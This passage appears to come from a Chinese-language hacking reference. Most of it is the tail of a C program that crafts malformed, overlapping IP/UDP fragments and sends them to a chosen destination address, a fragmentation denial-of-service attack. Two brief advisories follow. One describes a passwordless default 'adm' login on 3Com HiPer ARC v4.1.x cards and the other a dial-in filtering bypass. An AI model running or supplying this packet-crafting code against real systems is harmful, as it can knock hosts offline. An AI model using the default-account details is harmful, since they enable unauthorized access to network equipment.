
```c
byte = 0x45; /* IP 版本和头部长度 */
memcpy(p_ptr, &byte, sizeof(u_char));
p_ptr += 2; /* IP 服务类型 (跳过) */
*(u_short *)p_ptr = FIX(IPH + UDPH + 10); /* 总长度 */
p_ptr += 2;
*(u_short *)p_ptr = htons(242); /* IP 标识 */

p_ptr += 2;
*(u_short *)p_ptr |= FIX(IP_MF); /* IP 分片标志和偏移量 */

p_ptr += 2;
*(u_short *)p_ptr = 0x40; /* IP TTL */
byte = IPPROTO_UDP;
memcpy(p_ptr + 1, &byte, sizeof(u_char));
p_ptr += 4; /* IP 校验和由内核填充 */
*(u_long *)p_ptr = src_ip; /* IP 源地址 */
p_ptr += 4;
*(u_long *)p_ptr = dst_ip; /* IP 目的地址 */

p_ptr += 4;
*(u_short *)p_ptr = htons(src_ptr); /* UDP 源端口 */
p_ptr += 2;
*(u_short *)p_ptr = htons(dst_ptr); /* UDP 目的端口 */
p_ptr += 2;
*(u_short *)p_ptr = htons(8 + 10); /* UDP 总长度 */

if (sendto(sock, packet, IPH + UDPH + 10, 0, (struct sockaddr *)&sin,
sizeof(struct sockaddr)) == -1)
{
perror("\nsendto");
free(packet);
exit(1);
}

p_ptr = packet;
bzero((u_char *)p_ptr, IPH + UDPH + PADDING);

byte = 0x45; /* IP 版本和头部长度 */
memcpy(p_ptr, &byte, sizeof(u_char));
p_ptr += 2; /* IP 服务类型 (跳过) */
*(u_short *)p_ptr = FIX(IPH + UDPH + MAGIC2); /* 总长度 */
p_ptr += 2;
*(u_short *)p_ptr = htons(242); /* IP 标识 */

p_ptr += 2;
*(u_short *)p_ptr = FIX(6);       /* IP 分片标志和偏移量 */

p_ptr += 2;
*(u_short *)p_ptr = 0x40;        /* IP TTL */
byte = IPPROTO_UDP;
memcpy(p_ptr + 1, &byte, sizeof(u_char));
p_ptr += 4;                       /* IP 校验和由内核填充 */
*(u_long *)p_ptr = src_ip;      /* IP 源地址 */
p_ptr += 4;
*(u_long *)p_ptr = dst_ip;      /* IP 目的地址 */
p_ptr += 4;
*(u_short *)p_ptr = htons(src_ptr);      /* UDP 源端口 */

p_ptr += 2;
*(u_short *)p_ptr = htons(dst_ptr);   /* UDP 目的端口 */
p_ptr += 2;
*(u_short *)p_ptr = htons(8 + MAGIC2);  /* UDP 总长度 */

if (sendto(sock, packet, IPH + UDPH + MAGIC2, 0, (struct sockaddr *)&sin,
              sizeof(struct sockaddr)) == -1)
{
    perror("\nsendto");
    free(packet);
    exit(1);
}

p_ptr = packet;
bzero((u_char *)p_ptr, IPH + UDPH + PADDING+40);
byte = 0x4F;                       /* IP 版本和头部长度 */
memcpy(p_ptr, &byte, sizeof(u_char));
p_ptr += 2;                       /* IP 服务类型 (跳过) */
*(u_short *)p_ptr = FIX(IPH + UDPH + PADDING+40); /* 总长度 */
p_ptr += 2;
*(u_short *)p_ptr = htons(242);  /* IP 标识 */
p_ptr += 2;
*(u_short *)p_ptr = 0 | FIX(IP_MF); /* IP 分片标志和偏移量 */
p_ptr += 2;
*(u_short *)p_ptr = 0x40;               /* IP TTL */
byte = IPPROTO_UDP;
memcpy(p_ptr + 1, &byte, sizeof(u_char));
p_ptr += 4;                       /* IP 校验和由内核填充 */
*(u_long *)p_ptr = src_ip;               /* IP 源地址 */
    p_ptr += 4;
*(u_long *)p_ptr = dst_ip;               /* IP 目的地址 */

    p_ptr += 44;
    *(u_short *)p_ptr = htons(src_ptr);    /* UDP 源端口 */
    p_ptr += 2;
*(u_short *)p_ptr = htons(dst_ptr);        /* UDP 目的端口 */

    p_ptr += 2;
*(u_short *)p_ptr = htons(8 + PADDING);    /* UDP 总长度 */


    for(i=0;i<PADDING;i++)
    {
        p_ptr[i++]=random()%255;
    }

    if (sendto(sock, packet, IPH + UDPH + PADDING+40, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr)) == -1)
    {
        perror("\nsendto");
        free(packet);
        exit(1);
    }
    free(packet);
}

u_long name_resolve(u_char *host_name)
{
    struct in_addr addr;
    struct hostent *host_ent;

    if ((addr.s_addr = inet_addr(host_name)) == -1)
    {
        if (! (host_ent = gethostbyname(host_name))) return (0);
        bcopy(host_ent->h_addr, (char *)&addr.s_addr, host_ent->h_length);
    }
    return (addr.s_addr);
}

void usage(u_char *name)
{
    fprintf(stderr,
            "\n%s src_ip dst_ip [ -s src_ptr ] [ -t dst_ptr ] [ -n how_many ]\n", name);
    exit(0);
}
```

## HiPer ARC 卡登录

**概要：** HiPer ARC 卡的默认 `adm` 账户存在潜在弱点。

**攻击状态：** 未认证访问。

**易受攻击性：** HiPer ARC 卡 v4.1.x 版本。

**入侵详情：** 3Com 为 HiPer ARC 卡开发的软件（v4.1.x 版本）构成了潜在的安全威胁。上传软件后，会出现一个名为 `adm` 的登录账户，且没有密码。当然，安全策略要求从配置中删除默认的 `adm` 登录。然而，一旦设备完成配置，必须保存设置并重启设备。此时，`adm` 登录（无需密码）仍然保持活动状态，且无法删除。

## 过滤

**概要：** 带有拨入连接的过滤功能无效。基本上，用户可以拨入，收到“host”提示符，然后输入任何主机名，而无需经过实际的认证过程。因此，系统日志报告会显示连接被拒绝。

**攻击状态：** 未认证访问。
